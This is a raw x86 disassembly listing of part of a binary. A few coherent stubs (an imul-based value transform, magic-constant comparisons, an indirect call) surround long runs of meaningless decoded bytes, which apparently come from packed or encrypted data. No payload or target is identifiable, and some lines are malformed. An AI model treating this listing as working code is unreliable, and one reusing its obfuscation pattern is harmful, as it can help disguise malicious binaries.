  40207b:	mov    DWORD PTR ds:0x42ee24,0x6138
  402085:	cmp    eax,DWORD PTR [edx]
  402087:	mov    DWORD PTR ds:0x42e75a,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e762,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi+0x20428ad],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x40208d
  4020cf:	cmp    al,0x5a
  4020d1:	xchg   edi,eax
  4020d2:	int    0xe
  4020d4:	xor    sp,ax
  4020d7:	cdq    
  4020d8:	lods   eax,DWORD PTR ds:[esi]
  4020d9:	cmc    
  4020da:	popa   
  4020db:	adc    dh,bh
  4020dd:	inc    eax
  4020de:	sbb    BYTE PTR [ebx+0x2b],bl
  4020e1:	(bad)  
  4020e2:	out    0xa2,eax
  4020e4:	aam    0xbf
  4020e6:	push   es
  4020e7:	xor    BYTE PTR [edx],ch
  4020e9:	icebp  
  4020ea:	xor    dh,BYTE PTR [edi-0x7792bc25]
  4020f0:	xor    edx,DWORD PTR [esi+0x23514481]
  4020f6:	(bad)  
  4020f8:	jg     0x40208d
  4020fa:	jecxz  0x402110
  4020fc:	or     eax,DWORD PTR [ebx+ebp*1-0x440d78d9]
  402103:	das    
  402104:	neg    BYTE PTR [edx]
  402106:	mov    esp,0x5fa78247
  40210b:	mov    esi,0x8eaadfb6
  402110:	cs (bad) 
  402112:	aas    
  402113:	fild   QWORD PTR [esp+0x6f7dd356]
  40211a:	or     BYTE PTR [ebx-0x60],0x7e
  40211e:	mov    bh,0x2f
  402120:	cmp    BYTE PTR [ecx],ch
  402122:	mov    dh,0x32
  402125:	ret    
  402126:	mov    bh,0x6f
  402128:	push   eax
  402129:	inc    ebx
  40212a:	out    dx,eax
  40212b:	jg     0x402175
  40212d:	mov    al,ds:0xdd4bb41b
  402132:	mov    ah,0x31
  402134:	adc    edx,DWORD PTR [ebx+eax*4+0x2326e5df]
  40213b:	xchg   ecx,eax
  40213c:	rcr    edi,0x1a
  40213f:	inc    ecx
  402140:	ds loopne 0x4020d4
  402143:	popf   
  402144:	and    eax,0xcb64602d
  402149:	inc    ebx
  40214a:	and    dl,BYTE PTR [edx+0x31c21949]
  402150:	shl    ebp,1
  402152:	dec    edi
  402153:	inc    edi
  402154:	jns    0x402156
  402156:	(bad)  
  402157:	call   0xf413:0x586b1472
  40215e:	dec    esp
  40215f:	retf   0xe8d1
  402162:	cmp    BYTE PTR [ecx+0x59],cl
  402165:	sub    al,0xaa
  402167:	dec    esp
  402168:	(bad)  
  402169:	sub    ebp,DWORD PTR [eax-0x16f45e0c]
  40216f:	test   BYTE PTR [edx+0x3f],0xc1
  402173:	push   0xffffffdf
  402175:	arpl   di,si
  402177:	mov    edx,0x7900699e
  40217c:	int3   
  40217d:	fbstp  TBYTE PTR [ebp+0x2bed185c]
  402183:	xlat   BYTE PTR ds:[ebx]
  402184:	fcomp  QWORD PTR [esi+0x354d1cf8]
  40218a:	ss inc esi
  40218c:	adc    eax,0xf91359f3
  402191:	and    BYTE PTR [edx-0x7c7bb905],ah
  402197:	push   cs
  402198:	push   0x1c
  40219a:	inc    ecx
  40219b:	dec    esi
  40219c:	or     eax,0x7627f986
  4021a1:	ins    DWORD PTR es:[edi],dx
  4021a2:	jae    0x4021a5
  4021a4:	(bad)  
  4021a5:	sbb    eax,0x218cdef6
  4021aa:	pop    ds
  4021ab:	push   ebp
  4021ac:	outs   dx,BYTE PTR ds:[esi]
  4021ad:	loopne 0x4021bf
  4021af:	into   
  4021b0:	mov    dl,0xce
  4021b2:	mov    esp,0xf65d993d
  4021b7:	loope  0x4021cd
  4021b9:	add    al,0xe1
  4021bb:	es sahf 
  4021bd:	jp     0x40218f
  4021bf:	sub    al,0x43
  4021c1:	mov    DWORD PTR [ecx-0x73c77ea6],esp
  4021c7:	jnp    0x402180
  4021c9:	aam    0xf5
  4021cb:	and    eax,0xe8edce01
  4021d0:	inc    esi
  4021d1:	rcl    DWORD PTR [esi],1
  4021d3:	jmp    0x4f04:0xbafbc237
  4021da:	ins    BYTE PTR es:[edi],dx
  4021db:	cmp    al,0x39
  4021dd:	add    DWORD PTR [edi],ebx
  4021df:	es mov ah,0xb5
  4021e2:	mov    al,0x71
  4021e4:	mov    ch,0x41
  4021e6:	push   ecx
  4021e7:	call   0x5ca5:0xef3f55b1
  4021ee:	(bad)  
  4021ef:	and    BYTE PTR [esi+0x2457863b],bh
  4021f5:	push   edx
  4021f6:	xor    eax,0xf69915c1
  4021fb:	jl     0x40219b
  4021fd:	fucomi st,st(0)
  4021ff:	or     ch,0x6b
  402202:	push   edx
  402203:	jle    0x402229
  402205:	shr    DWORD PTR [ecx-0x3d],1
  402208:	js     0x4021b4
  40220a:	cdq    
  40220b:	mov    gs,WORD PTR [esi-0xe]
  40220e:	bound  ecx,QWORD PTR [ecx+0x43]
  402211:	inc    edi
  402212:	or     ah,ch
  402214:	adc    bh,dl
  402216:	xchg   BYTE PTR [eax+0x22],bl
  402219:	in     al,dx
  40221a:	mov    esp,0x57ff68c0
  40221f:	clc    
  402220:	and    DWORD PTR [esi-0x105221fb],eax
  402226:	push   ds
  402227:	xor    bh,ch
  402229:	or     esp,DWORD PTR ds:0x6904ceaa
  40222f:	jno    0x4021d7
  402231:	loop   0x4021e5
  402233:	adc    eax,DWORD PTR [edi-0x22]
  402236:	mov    bl,0xa7
  402238:	stos   BYTE PTR es:[edi],al
  402239:	cdq    
  40223a:	add    BYTE PTR ds:[esi-0x12546165],al
  402241:	loope  0x4021d8
  402243:	xor    cl,BYTE PTR gs:[esi-0x21]
  402247:	cmp    BYTE PTR [edx+0x33ce1745],0xf6
  40224e:	fild   DWORD PTR [eax]
  402250:	mov    es,ecx
  402252:	xchg   edx,eax
  402253:	and    eax,0x1f3f1a5b
  402258:	jns    0x402285
  40225a:	mov    edx,0x9c4d37d4
  40225f:	(bad)  
  402260:	xlat   BYTE PTR ds:[ebx]
  402261:	push   edx
  402262:	xor    esp,esi
  402264:	es cdq 
  402266:	js     0x4022a6
  402268:	lods   al,BYTE PTR ds:[esi]
  402269:	inc    eax
  40226a:	fidivr WORD PTR [ecx]
  40226c:	and    BYTE PTR [ebx-0x11],ch
  40226f:	jle    0x4022d3
  402271:	ss xchg edx,eax
  402273:	test   BYTE PTR [eax+eax*4-0x4b],al
  402277:	add    eax,0xa0b1522
  40227c:	dec    ebp
  40227d:	popa   
  40227e:	in     al,0x20
  402280:	cli    
  402281:	cmp    BYTE PTR [ecx+0x6f135bec],bh
  402287:	iret   
  402288:	xor    dh,BYTE PTR [esi]
  40228a:	ins    DWORD PTR es:[edi],dx
  40228b:	cmp    DWORD PTR [eax+0x3b2da7be],esi
  402291:	jae    0x40223b
  402293:	shr    dl,0xf
  402296:	xor    al,0xe3
  402298:	add    ah,BYTE PTR [ebp-0x37]
  40229b:	fldcw  WORD PTR [eax]
  40229d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40229e:	inc    ebp
  40229f:	cmp    edi,0xffffffd4
  4022a2:	push   esi
  4022a3:	in     al,0xb9
  4022a5:	xor    edx,DWORD PTR [eax+ebp*4-0x6b3beae7]
  4022ac:	ins    BYTE PTR es:[edi],dx
  4022ad:	dec    ebx
  4022ae:	jmp    0xfc86:0xf6b2e98a
  4022b5:	xchg   DWORD PTR [esi],edi
  4022b7:	and    eax,0xa23bb0d8
  4022bc:	test   al,0x46
  4022be:	adc    bl,BYTE PTR [edx+0x3b62e2e4]
  4022c4:	in     eax,dx
  4022c5:	mov    dh,0xcc
  4022c7:	jle    0x40232a
  4022c9:	cmp    eax,0xa025f82a
  4022ce:	(bad)  
  4022cf:	mov    BYTE PTR [ecx-0x1b48de62],bh
  4022d5:	xor    eax,0x68c317a6
  4022da:	dec    esi
  4022db:	aaa    
  4022dc:	cmp    eax,DWORD PTR ds:0x780b4229
  4022e2:	xchg   edi,eax
  4022e3:	mov    DWORD PTR ds:0xdebe4c1c,edx
  4022e9:	ds mov dh,0xa1
  4022ec:	inc    ecx
  4022ed:	out    dx,al
  4022ee:	dec    esi
  4022ef:	retf   
  4022f0:	fimul  WORD PTR [edx]
  4022f2:	imul   ebp,DWORD PTR [esi+0x2c07c34d],0x11
  4022f9:	popa   
  4022fa:	shr    edi,1
  4022fc:	ret    
  4022fd:	aad    0x5f
  4022ff:	push   ebp
  402300:	sub    al,0xf0
  402302:	mov    al,0x57
  402304:	pop    esi
  402305:	cli    
  402306:	and    eax,0xb710b021
  40230b:	pop    esp
  40230c:	pop    esp
  40230d:	sbb    al,0x4
  40230f:	shr    DWORD PTR [edi],0xc7
  402312:	lea    esi,[edx]
  402314:	jge    0x40231f
  402316:	lea    ebx,ds:0x5443803b
  40231c:	rcr    BYTE PTR [ecx],cl
  40231e:	jmp    0x4ae5:0xe0a62e9b
  402325:	mov    ah,BYTE PTR [ebp-0x29]
  402328:	adc    dl,ch
  40232a:	test   BYTE PTR [eax],bh
  40232c:	push   ss
  40232d:	push   cs
  40232e:	ja     0x4022fc
  402330:	popa   
  402331:	call   ebp
  402333:	fist   WORD PTR [edi+0x7426446a]
  402339:	mov    ds,eax
  40233b:	mov    ah,0xc5
  40233d:	lahf   
  40233e:	push   ebp
  40233f:	test   BYTE PTR [eax-0x47],bl
  402342:	mov    eax,ds:0x38986573
  402347:	mov    BYTE PTR [ecx+0x4],dh
  40234a:	data16 jg 0x4022f9
  40234d:	jl     0x402352
  40234f:	xchg   esi,eax
  402350:	ficom  WORD PTR [edx-0x69]
  402353:	add    eax,0x63cf4911
  402358:	push   esp
  402359:	out    dx,eax
  40235a:	dec    esp
  40235b:	cs popf 
  40235d:	ficomp DWORD PTR [ebp+0x27cf685c]
  402363:	loopne 0x402304
  402365:	pusha  
  402366:	push   esi
  402367:	push   es
  402368:	pop    ss
  402369:	aam    0x2f
  40236b:	in     eax,dx
  40236c:	mov    WORD PTR [ebp-0x7],fs
  40236f:	stos   BYTE PTR es:[edi],al
  402370:	sub    BYTE PTR [eax+edi*8-0x32],bh
  402374:	sti    
  402375:	stos   DWORD PTR es:[edi],eax
  402376:	fcom   DWORD PTR [esi-0x5f]
  402379:	cmp    ecx,DWORD PTR [ebp+0x69]
  40237c:	int3   
  40237d:	mov    ecx,DWORD PTR [eax+eax*8]
  402380:	push   es
  402381:	in     eax,0x89
  402383:	ja     0x402400
  402385:	idiv   dl
  402387:	xor    DWORD PTR [esi],ecx
  402389:	leave  
  40238a:	xor    ecx,DWORD PTR [ebp-0x76]
  40238d:	xchg   edi,eax
  40238e:	fild   QWORD PTR [edi-0x7e]
  402391:	and    al,0xc6
  402393:	pop    ebp
  402394:	xchg   ebx,eax
  402395:	aad    0x12
  402397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402398:	aas    
  402399:	fisttp WORD PTR [edi-0x67818a0e]
  40239f:	adc    eax,0xd8ed0f83
  4023a4:	pop    esp
  4023a5:	je     0x402393
  4023a7:	cmp    al,0x6d
  4023a9:	imul   ebp,DWORD PTR [ebx-0x34260d3f],0x19
  4023b0:	out    0x6c,eax
  4023b2:	scas   al,BYTE PTR es:[edi]
  4023b3:	imul   esp,DWORD PTR [edx],0x57
  4023b6:	mov    ecx,0xc239af4f
  4023bb:	sub    eax,0x98077f11
  4023c0:	mov    eax,ds:0x6b0d4e1b
  4023c5:	or     edx,DWORD PTR [eax+0x22]
  4023c8:	out    dx,al
  4023c9:	mov    ecx,0x51f72857
  4023ce:	stos   DWORD PTR es:[edi],eax
  4023cf:	add    al,dl
  4023d1:	jnp    0x402414
  4023d3:	jmp    0x518d:0x814a08ae
  4023da:	jg     0x402386
  4023dc:	inc    edi
  4023dd:	retf   
  4023de:	cmp    bl,bh
  4023e0:	adc    BYTE PTR [edx+0x739ff7f7],bl
  4023e6:	sub    al,0x8d
  4023e8:	mov    eax,eax
  4023ea:	loopne 0x402444
  4023ec:	fwait
  4023ed:	pop    esp
  4023ee:	inc    ebp
  4023ef:	ret    0x7ea9
  4023f2:	and    BYTE PTR [edx-0x162157ed],bl
  4023f8:	test   BYTE PTR [ecx-0x74],cl
  4023fb:	pop    ebp
  4023fc:	mov    ds:0xc865985b,al
  402401:	mov    ecx,0xad9c7c3e
  402406:	xchg   esp,eax
  402407:	xor    al,0xae
  402409:	out    0xef,al
  40240b:	push   ebp
  40240c:	invd   
  40240e:	(bad)  
  40240f:	div    ch
  402411:	xor    esi,DWORD PTR [esi-0x5]
  402414:	or     ecx,eax
  402416:	fdivr  DWORD PTR [edx*4+0x3963e69]
  40241d:	popa   
  40241e:	and    DWORD PTR [bp+di+0x5257],0xffffffb6
  402424:	cmp    al,0x4e
  402426:	jae    0x402485
  402428:	dec    edx
  402429:	test   eax,0x436befd4
  40242e:	(bad)
  402432:	test   ah,dh
  402434:	or     eax,0xf97777e0
  402439:	scas   al,BYTE PTR es:[edi]
  40243a:	fadd   QWORD PTR [esi]
  40243c:	xchg   BYTE PTR [bp+si],dl
  40243f:	das    
  402440:	jno    0x4023cb
  402442:	sbb    eax,0xb8c8b729
  402447:	pop    edi
  402448:	loope  0x4024b0
  40244a:	clc    
  40244b:	mov    dl,0xb7
  40244d:	out    0xa5,al
  40244f:	inc    edi
  402450:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  402452:	cdq    
  402453:	push   0x7
  402455:	dec    ebx
  402456:	dec    eax
  402457:	and    eax,0x99c6e223
  40245c:	jmp    0x402466
  40245e:	adc    BYTE PTR [esi+0x17],ch
  402461:	pushf  
  402462:	mov    edx,DWORD PTR [eax]
  402464:	imul   edx,edx,0xf89ea9ee
  40246a:	mov    DWORD PTR ds:0x430546,0x7964
  402474:	mov    DWORD PTR [eax],edx
  402476:	mov    DWORD PTR ds:0x4304be,0x7646
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x4304ba,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	test   DWORD PTR gs:[ecx+0x7e0f52eb],ebx
  4024b9:	jle    0x40243d
  4024bb:	jno    0x40253b
  4024bd:	jle    0x40247f
  4024bf:	push   ss
  4024c0:	mov    WORD PTR [esi],ds
  4024c2:	adc    esi,DWORD PTR [eax+0x63]
  4024c5:	xchg   esp,eax
  4024c6:	xor    BYTE PTR [eax],dl
  4024c8:	mov    dh,0xd6
  4024ca:	mov    ebx,0x89166b53
  4024cf:	cmp    al,BYTE PTR [ebp-0x46]
  4024d2:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4024d4:	ss hlt 
  4024d6:	cmp    BYTE PTR [edi-0x662a68de],dh
  4024dc:	mov    ecx,0x634f0c81
  4024e1:	jle    0x4024cd
  4024e3:	imul   BYTE PTR [esi+0x660bb5a3]
  4024e9:	xchg   BYTE PTR gs:[eax+0x15],cl
  4024ed:	(bad)  
  4024ee:	cld    
  4024ef:	xor    edx,DWORD PTR [ecx-0x7d]
  4024f2:	and    BYTE PTR ds:0xf730b3f9,ah
  4024f8:	les    ebp,FWORD PTR [ebp+0x7408b042]
  4024fe:	out    dx,eax
  4024ff:	mov    ch,BYTE PTR [eax]
  402501:	sub    eax,0xb3631d67
  402506:	fs enter 0x82ff,0xc1
  40250b:	stc    
  40250c:	je     0x40249d
  40250e:	retf   0xb95e
  402511:	lea    ebx,[edx+edi*4-0x42]
  402515:	std    
  402516:	mov    edx,0x35c8902d
  40251b:	in     al,dx
  40251c:	sbb    eax,0x44f04577
  402521:	mov    bl,0x7a
  402523:	push   0xae8ff1de
  402528:	ror    BYTE PTR [esi+0x2c],0xa6
  40252c:	int    0xb3
  40252e:	fimul  WORD PTR [edx+eiz*2-0x50]
  402532:	adc    BYTE PTR [ebx],dl
  402534:	push   ecx
  402535:	adc    dh,cl
  402537:	push   ecx
  402538:	and    BYTE PTR [eax],ch
  40253a:	loop   0x40258b
  40253c:	mov    bh,0x70
  40253e:	call   0x4ec8:0xb06d78a4
  402545:	push   es
  402546:	mov    ds:0x25f11902,eax
  40254b:	in     al,dx
  40254c:	(bad)
  402550:	and    BYTE PTR ds:0x638d1605,0x65
  402557:	push   cs
  402558:	adc    DWORD PTR [edi],ebx
  40255a:	inc    ebp
  40255b:	pusha  
  40255c:	mul    BYTE PTR [eax+0x9719d5c]
  402562:	mov    edi,?
  402564:	mov    ebp,0x62f64722
  402569:	jle    0x4025ce
  40256b:	dec    ebp
  40256c:	fisub  DWORD PTR [ecx]
  40256e:	mov    ebp,0x40b52229
  402573:	icebp  
  402574:	pop    ss
  402575:	nop
  402576:	cli    
  402577:	dec    edi
  402578:	mov    ds:0xa30e381f,eax
  40257d:	pop    ebp
  40257e:	dec    ebx
  40257f:	xor    eax,eax
  402581:	int3   
  402582:	inc    ebx
  402583:	std    
  402584:	popa   
  402585:	xchg   edx,eax
  402586:	pop    esp
  402587:	popa   
  402588:	out    dx,al
  402589:	sbb    BYTE PTR [eax+0x40],dh
  40258c:	rcl    DWORD PTR ds:0x37dc5c72,1
  402592:	mov    esp,0x48618614
  402597:	mov    edx,0x668292ec
  40259c:	xor    edi,edx
  40259e:	rcr    DWORD PTR [edi],1
  4025a0:	and    eax,0x24506eaf
  4025a5:	sub    ah,BYTE PTR [edi-0x39]
  4025a8:	sub    ah,BYTE PTR [eax+0x73]
  4025ab:	xchg   esi,eax
  4025ac:	pop    es
  4025ad:	inc    ebp
  4025ae:	das    
  4025af:	sbb    al,0xfe
  4025b1:	jl     0x4025a3
  4025b3:	outs   dx,DWORD PTR ds:[esi]
  4025b4:	xor    eax,0x4d6cdf25
  4025b9:	daa    
  4025ba:	and    al,ah
  4025bc:	mov    WORD PTR [ecx+0x68],?
  4025bf:	jbe    0x402604
  4025c1:	sbb    eax,DWORD PTR [edi]
  4025c3:	xchg   esp,eax
  4025c4:	mov    ecx,esi
  4025c6:	retf   0x5ac5
  4025c9:	mov    ch,0x8d
  4025cb:	adc    DWORD PTR [edx-0x7fefede],esp
  4025d1:	in     al,0xec
  4025d3:	lods   al,BYTE PTR ds:[esi]
  4025d4:	inc    eax
  4025d5:	dec    eax
  4025d6:	sbb    BYTE PTR [ebp-0x5d],0xd4
  4025da:	bound  esi,QWORD PTR [esi+0x470ba322]
  4025e0:	pusha  
  4025e1:	sub    al,0xed
  4025e3:	loop   0x402626
  4025e5:	sub    BYTE PTR [esi-0x24],dl
  4025e8:	sub    edi,esp
  4025ea:	cmp    eax,0x597d9454
  4025ef:	cmp    DWORD PTR [ecx-0x24],esp
  4025f2:	cmp    WORD PTR [ebx-0x52],dx
  4025f6:	cmp    DWORD PTR [edi-0x1e780b5c],esp
  4025fc:	or     edx,DWORD PTR [esp+edi*2+0x58]
  402600:	test   al,dh
  402602:	fxch   st(2)
  402604:	or     BYTE PTR [edx-0x4d],ch
  402607:	xor    al,cl
  402609:	loope  0x4025bb
  40260b:	rcl    BYTE PTR [ebp-0x5b],0x7a
  40260f:	sbb    esi,ecx
  402611:	pop    eax
  402612:	jp     0x402638
  402614:	jp     0x4025ec
  402616:	sbb    ebx,edi
  402618:	pop    ebx
  402619:	xchg   esi,eax
  40261a:	dec    edx
  40261b:	les    ecx,FWORD PTR [esi]
  40261d:	xchg   ecx,eax
  40261e:	and    DWORD PTR ds:0x3c4591e9,ebx
  402624:	retf   
  402625:	in     al,dx
  402626:	pop    es
  402627:	dec    edi
  402628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402629:	push   cs
  40262a:	add    al,0x87
  40262c:	call   DWORD PTR [ecx+0x66]
  40262f:	retf   0x8f0e
  402632:	lods   al,BYTE PTR ds:[esi]
  402633:	stos   BYTE PTR es:[edi],al
  402634:	shr    BYTE PTR [edi-0x4caacd01],1
  40263a:	imul   ecx,ebx,0xe940efd8
  402640:	pop    ecx
  402641:	outs   dx,DWORD PTR ds:[esi]
  402642:	pop    edx
  402643:	cmp    eax,0xb54e57ea
  402648:	fcomp  QWORD PTR [ecx-0x68]
  40264b:	push   edx
  40264c:	mov    al,ds:0xca4914c4
  402651:	xor    ch,0x40
  402654:	pop    esp
  402655:	cmovo  edi,DWORD PTR [ecx]
  402658:	inc    esi
  402659:	jecxz  0x40262c
  40265b:	arpl   WORD PTR [eax+ebx*2+0x12],di
  40265f:	ja     0x40265e
  402661:	arpl   cx,si
  402663:	test   al,0xd2
  402665:	stos   DWORD PTR es:[edi],eax
  402666:	mov    ah,0x49
  402668:	into   
  402669:	call   0x9436:0x5c409990
  402670:	loop   0x4026d1
  402672:	stos   BYTE PTR es:[edi],al
  402673:	inc    edi
  402674:	daa    
  402675:	mov    al,ds:0x18cb149d
  40267a:	pop    ebx
  40267b:	jecxz  0x402649
  40267d:	or     BYTE PTR [ebp+0x38],ah
  402680:	ds mov cs,ecx
  402683:	sahf   
  402684:	pop    ebx
  402685:	pusha  
  402686:	jo     0x4026c6
  402688:	or     DWORD PTR [ecx],edi
  40268a:	ins    BYTE PTR es:[edi],dx
  40268b:	aam    0xd7
  40268d:	retf   
  40268e:	xchg   ecx,eax
  40268f:	inc    esp
  402691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402692:	iret   
  402693:	ror    dl,cl
  402695:	add    DWORD PTR [esp+ebx*2-0x4cea8e0f],ebp
  40269c:	xchg   ebp,eax
  40269d:	sub    al,0x33
  40269f:	push   ecx
  4026a0:	fdivr  DWORD PTR [ebp-0x6aa7560a]
  4026a6:	push   ss
  4026a7:	mov    ecx,0x6afe5732
  4026ac:	test   BYTE PTR [eiz*1+0x2a03c8eb],dl
  4026b3:	cli    
  4026b4:	and    al,0x71
  4026b6:	mov    ah,0xf9
  4026b8:	xchg   ecx,eax
  4026b9:	and    DWORD PTR ds:0x630c1884,edx
  4026bf:	xchg   ebp,eax
  4026c0:	or     dh,BYTE PTR [ecx+0x27db5306]
  4026c6:	ret    
  4026c7:	rol    BYTE PTR [ebx+0x649a73cc],cl
  4026cd:	js     0x4026ac
  4026cf:	(bad)  
  4026d1:	and    DWORD PTR [esi-0x49a66354],ebx
  4026d7:	repz pop edi
  4026d9:	mov    al,bl
  4026db:	sar    BYTE PTR [eax+0x39],0xe4
  4026df:	(bad)  
  4026e0:	stos   BYTE PTR es:[edi],al
  4026e1:	stos   DWORD PTR es:[edi],eax
  4026e2:	shr    DWORD PTR [edi],0x27
  4026e5:	and    dl,bh
  4026e7:	inc    ebx
  4026e8:	cmp    DWORD PTR fs:[edi],esi
  4026eb:	jle    0x402734
  4026ed:	adc    bl,BYTE PTR [ebx]
  4026ef:	xchg   edi,eax
  4026f0:	in     eax,dx
  4026f1:	std    
  4026f2:	loope  0x4026b6
  4026f4:	or     BYTE PTR [esi-0x1d],0x1
  4026f8:	xchg   ebx,eax
  4026f9:	fadd   DWORD PTR [ebp-0x60]
  4026fc:	push   ds
  4026fd:	shl    BYTE PTR [ebp-0x28],1
  402700:	inc    ecx
  402701:	cdq    
  402702:	popf   
  402703:	mov    ds:0x6ced4dba,al
  402708:	pop    ebp
  402709:	sbb    al,dh
  40270b:	sub    ch,dl
  40270d:	mov    ebp,0xa79a94e0
  402712:	inc    esi
  402713:	sbb    BYTE PTR [edx+0x6],ch
  402716:	call   0xdf55:0x97c07cf4
  40271d:	hlt    
  40271e:	xor    bl,al
  402720:	pop    ecx
  402721:	adc    BYTE PTR [ebx+0x6f],cl
  402724:	(bad)  
  402725:	mov    al,0x4f
  402727:	mov    ebx,0xc3b81014
  40272c:	out    0x13,eax
  40272e:	cmp    al,0xa1
  402730:	cdq    
  402731:	push   es
  402732:	add    al,0x90
  402734:	sbb    BYTE PTR [ebx-0x39],0x7c
  402738:	mov    WORD PTR [esi],es
  40273a:	leave  
  40273b:	or     al,0xf4
  40273d:	out    dx,eax
  40273e:	fsubr  QWORD PTR [edi-0x5d]
  402741:	adc    al,0x50
  402743:	jle    0x402780
  402745:	mov    ah,0x1f
  402747:	(bad)  
  402748:	mov    bl,dh
  40274a:	pop    es
  40274b:	add    al,0x95
  40274d:	xchg   edi,eax
  40274e:	pop    eax
  40274f:	cmp    ch,BYTE PTR [edi+0x7924ec60]
  402755:	xchg   ecx,eax
  402756:	pushf  
  402757:	xor    edx,eax
  402759:	loopne 0x402782
  40275b:	or     al,0x40
  40275d:	test   al,0x32
  40275f:	cld    
  402760:	cmc    
  402761:	inc    edi
  402762:	aad    0xcf
  402764:	fild   DWORD PTR [eax-0x7e]
  402767:	shl    BYTE PTR gs:[ebx],1
  40276a:	in     al,dx
  40276b:	cdq    
  40276c:	mov    dl,0x51
  40276e:	(bad)  
  40276f:	arpl   WORD PTR [edi+0x7fd5605e],ax
  402775:	test   al,0x5c
  402777:	add    al,0x18
  402779:	out    dx,eax
  40277a:	jl     0x4027c5
  40277c:	stc    
  40277d:	ret    0x569f
  402780:	adc    DWORD PTR [ecx+0x2a],esi
  402783:	in     al,dx
  402784:	jge    0x402726
  402786:	mov    ds:0xcfae7147,eax
  40278b:	and    al,0xc5
  40278d:	xchg   DWORD PTR [eax],esi
  40278f:	cmp    BYTE PTR [ebp+eax*8+0x3c],cl
  402793:	or     al,0x39
  402795:	je     0x4027f4
  402797:	mov    fs,WORD PTR [edi-0x4054b8ec]
  40279d:	outs   dx,BYTE PTR ds:[esi]
  40279e:	ret    
  40279f:	pop    edi
  4027a0:	out    0xd5,eax
  4027a2:	push   0xffffffb6
  4027a4:	dec    ebx
  4027a5:	xchg   ebp,eax
  4027a6:	in     al,dx
  4027a7:	push   esi
  4027a8:	inc    edi
  4027a9:	push   cs
  4027aa:	push   esi
  4027ab:	mov    ecx,0xfebe5ad2
  4027b1:	pop    ds
  4027b2:	rcl    DWORD PTR ds:0x350d73b5,1
  4027b8:	push   esi
  4027b9:	mov    bh,0xc3
  4027bb:	enter  0x68b1,0xca
  4027bf:	sub    eax,0xd804f8ee
  4027c4:	jae    0x402777
  4027c6:	outs   dx,DWORD PTR ds:[esi]
  4027c7:	js     0x402843
  4027c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027ca:	idiv   DWORD PTR [esi]
  4027cc:	das    
  4027cd:	fwait
  4027ce:	out    0xe9,eax
  4027d0:	xchg   ebx,eax
  4027d1:	sbb    al,BYTE PTR [ebp+ebp*1+0x9]
  4027d5:	fistp  QWORD PTR [eax+0x73]
  4027d8:	xchg   esi,eax
  4027d9:	test   eax,0xe05ac229
  4027de:	shl    ch,0xb3
  4027e1:	mov    dh,0xe0
  4027e3:	add    dh,BYTE PTR [esi+0x4d]
  4027e6:	cmp    BYTE PTR [eax],al
  4027e8:	and    DWORD PTR [ecx+0x27],edi
  4027eb:	cmp    al,BYTE PTR es:[ecx+eiz*8]
  4027ef:	stos   DWORD PTR es:[edi],eax
  4027f0:	js     0x4027bf
  4027f2:	pop    ebx
  4027f3:	sub    ch,BYTE PTR cs:[ecx-0x71]
  4027f7:	popa   
  4027f8:	add    BYTE PTR [edi+ecx*8-0x4fb24ecd],dl
  4027ff:	dec    edx
  402800:	xchg   DWORD PTR [esi],ecx
  402802:	or     ecx,DWORD PTR [eax-0x5424c95e]
  402808:	cs mov dl,dl
  40280b:	lods   al,BYTE PTR ds:[esi]
  40280c:	xchg   ebp,eax
  40280d:	pusha  
  40280e:	pop    ecx
  40280f:	sbb    BYTE PTR [eax+ebp*2],al
  402812:	popa   
  402813:	adc    DWORD PTR [ebp-0x71],ebx
  402816:	in     eax,dx
  402817:	inc    ebx
  402818:	mov    dl,0x6e
  40281a:	retf   0xc0d9
  40281d:	sahf   
  40281e:	mov    ch,0x1
  402820:	test   BYTE PTR [ebx+0x3c917367],bh
  402826:	fsub   QWORD PTR [edi+eiz*1-0x47]
  40282a:	push   ebp
  40282b:	ret    
  40282c:	inc    ebx
  40282d:	pop    ecx
  40282e:	jle    0x40284e
  402830:	fnstcw WORD PTR [edx-0x6d8a342b]
  402836:	shl    ebp,1
  402838:	popf   
  402839:	sub    BYTE PTR [edi],bh
  40283b:	mov    edx,DWORD PTR [edi-0x6cab32b7]
  402841:	add    ch,0x7c
  402844:	mov    dh,0xb1
  402846:	test   eax,0xf35149c5
  40284b:	inc    ecx
  40284c:	pop    ebx
  40284d:	sbb    dl,BYTE PTR [eax-0x7ef58169]
  402853:	or     BYTE PTR [esi-0x389f8ae4],bl
  402859:	add    eax,0x42e75e
  40285e:	adc    al,0x0
  402860:	add    BYTE PTR [eax],al
  402862:	cmp    DWORD PTR ds:0x42e75e,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e75e,0x6
  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
  40287f:	call   DWORD PTR ds:0x42e9d8
  402885:	cmp    DWORD PTR ds:0x42e75e,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
  402894:	xor    eax,DWORD PTR ds:0x42e75e
  40289a:	dec    eax
  40289b:	mov    ds:0x42e75e,eax
  4028a0:	mov    eax,ds:0x42e75e
